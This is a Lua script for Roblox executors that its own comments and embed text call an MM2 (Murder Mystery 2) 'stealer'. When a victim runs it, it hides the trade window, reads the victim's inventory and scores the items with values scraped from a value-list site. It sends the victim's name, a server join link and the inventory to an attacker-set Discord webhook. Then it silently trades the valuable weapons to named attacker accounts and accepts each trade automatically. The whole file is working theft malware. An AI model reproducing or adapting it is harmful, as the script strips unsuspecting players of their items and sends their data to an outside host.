local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Evitar ejecución múltiple
if getgenv().ScriptEjecutado then return end
getgenv().ScriptEjecutado = true

-- Configuración
local webhook = _G.webhook or ""
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1

local req = syn and syn.request or http_request or request
if not req then
    warn("No HTTP request method available!")
    return
end

-- Función para enviar webhook
local function SendWebhook(title, description, fields, prefix)
    local data = {
        ["content"] = prefix or "",
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description or "",
            ["color"] = 65280,
            ["fields"] = fields or {},
            ["thumbnail"] = {["url"] = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
            ["footer"] = {["text"] = "The best stealer by Anonimo 🇪🇨"}
        }}
    }
    local body = HttpService:JSONEncode(data)
    pcall(function()
        req({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = body
        })
    end)
end

-- Ocultar GUI de trade
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = playerGui:FindFirstChild(guiName)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled = false end)
        gui.Enabled = false
    end
end

-- Funciones de trade
local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user)
    local plrObj = Players:FindFirstChild(user)
    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
end
local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end

-- ===== MM2 Supreme value system =====
local database = require(game.ReplicatedStorage.Database.Sync.Item)
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}
local headers = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}

local function trim(s) return s:match("^%s*(.-)%s*$") end
local function fetchHTML(url)
    local res = request({Url=url, Method="GET", Headers=headers})
    return res.Body
end
local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        return tonumber(valueStr)
    end
end
local function extractItems(html)
    local items = {}
    for name, body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        name = trim(name:match("([^<]+)"):gsub("%s+"," "))
        name = trim((name:split(" Click "))[1])
        local value = parseValue(body)
        if value then items[name:lower()] = value end
    end
    return items
end
local function extractChroma(html)
    local chroma = {}
    for name, body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        name = trim(name:match("([^<]+)"):gsub("%s+"," ")):lower()
        local value = parseValue(body)
        if value then chroma[name] = value end
    end
    return chroma
end

local function buildValueList()
    local allValues, chromaValues = {}, {}
    local toFetch = {}
    for r,url in pairs(categories) do table.insert(toFetch,{rarity=r,url=url}) end
    local completed = 0
    local lock = Instance.new("BindableEvent")

    for _, cat in ipairs(toFetch) do
        task.spawn(function()
            local html = fetchHTML(cat.url)
            if html and html~="" then
                if cat.rarity~="chroma" then
                    local vals = extractItems(html)
                    for k,v in pairs(vals) do allValues[k]=v end
                else
                    chromaValues = extractChroma(html)
                end
            end
            completed += 1
            if completed==#toFetch then lock:Fire() end
        end)
    end
    lock.Event:Wait()

    local valueList = {}
    for dataid,item in pairs(database) do
        local name = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local hasChroma = item.Chroma or false
        if name~="" and rarity~="" then
            local weaponRarityIndex = table.find(rarityTable,rarity)
            local godlyIndex = table.find(rarityTable,"Godly")
            if weaponRarityIndex and weaponRarityIndex>=godlyIndex then
                if hasChroma then
                    for cname,val in pairs(chromaValues) do
                        if cname:find(name) then valueList[dataid]=val break end
                    end
                else
                    if allValues[name] then valueList[dataid]=allValues[name] end
                end
            end
        end
    end
    return valueList
end

-- ====================================

local weaponsToSend = {}
local totalValue = 0
local min_rarity_index = table.find(rarityTable, min_rarity)
local valueList = buildValueList()

-- Extraer armas que cumplen criterios
local profile = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
for id, amount in pairs(profile.Weapons.Owned) do
    local item = database[id]
    if item then
        local rarityIndex = table.find(rarityTable, item.Rarity)
        if rarityIndex and rarityIndex >= min_rarity_index then
            local value = valueList[id] or ({10,20})[math.random(1,2)]
            if value >= min_value then
                table.insert(weaponsToSend,{
                    DataID=id,
                    Amount=amount,
                    Value=value,
                    Rarity=item.Rarity
                })
                totalValue += value * amount
            end
        end
    end
end

-- Ordenar armas de mayor a menor por valor total
table.sort(weaponsToSend, function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)

-- Enviar webhook con victim y valor total por item
local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
local fields = {
    {name="Victim 👤:", value=LocalPlayer.Name, inline=true},
    {name="Enlaze para unirse🔗:", value=joinLink, inline=false},
    {name="Inventario📦:", value="", inline=false},
    {name="Valor total del inventario📦:", value=tostring(totalValue), inline=true}
}
for _, w in ipairs(weaponsToSend) do
    local totalItemValue = w.Value * w.Amount
    fields[3].value = fields[3].value .. string.format("%s x%s (%s) | Value: %s\n", w.DataID, w.Amount, w.Rarity, tostring(totalItemValue))
end
local prefix = _G.pingEveryone == "Yes" and "@everyone " or ""
SendWebhook("💪MM2 Hit el mejor stealer💯", "💰Disfruta todas las armas gratis 😎", fields, prefix)

-- Función principal de trade
local function doTrade(targetName)
    while #weaponsToSend > 0 do
        local status = getTradeStatus()
        if status == "None" then
            sendTradeRequest(targetName)
        elseif status == "SendingRequest" then
            task.wait(0.3)
        elseif status == "StartTrade" then
            for i = 1, math.min(4, #weaponsToSend) do
                local w = table.remove(weaponsToSend,1)
                for _=1,w.Amount do addWeaponToTrade(w.DataID) end
            end
            task.wait(6)
            acceptTrade()
            waitForTradeCompletion()
        else
            task.wait(0.5)
        end
        task.wait(1)
    end
end

-- Esperar al usuario en chat para iniciar trade
for _, p in ipairs(Players:GetPlayers()) do
    if table.find(users, p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end
Players.PlayerAdded:Connect(function(p)
    if table.find(users, p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end)
